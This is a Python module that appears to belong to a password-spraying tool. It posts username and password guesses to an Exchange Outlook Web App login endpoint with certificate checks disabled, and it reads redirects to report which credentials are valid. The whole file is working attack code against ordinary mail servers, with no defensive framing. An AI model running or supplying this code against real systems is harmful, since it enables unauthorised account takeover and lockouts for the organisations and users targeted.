"""Exchange OWA spray target using form POST to /owa/auth.owa."""
import requests

from . import DEFAULT_TIMEOUT as _TIMEOUT

def attempt(username: str, password: str, base_url: str) -> dict:
    """
    Returns dict with keys: success (bool), locked (bool), notes (str).
    base_url should be like https://mail.company.com (no trailing slash).
    """
    url = f"{base_url}/owa/auth.owa"
    data = {
        "destination": f"{base_url}/owa/",
        "flags": "4",
        "forcedownlevel": "0",
        "username": username,
        "password": password,
        "passwordText": "",
        "isUtf8": "1",
    }
    try:
        r = requests.post(
            url, data=data, allow_redirects=False, timeout=_TIMEOUT, verify=False
        )
    except Exception as e:
        return {"success": False, "locked": False, "notes": f"request error: {e}"}

    if r.status_code == 429:
        return {"success": False, "locked": False, "notes": "rate_limited"}

    location = r.headers.get("Location", "")
    if r.status_code in (301, 302) and "loginfailure" not in location and location:
        return {"success": True, "locked": False, "notes": "valid"}

    if "loginfailure" in location or r.status_code == 200:
        return {"success": False, "locked": False, "notes": "invalid"}

    return {"success": False, "locked": False, "notes": f"status={r.status_code}"}
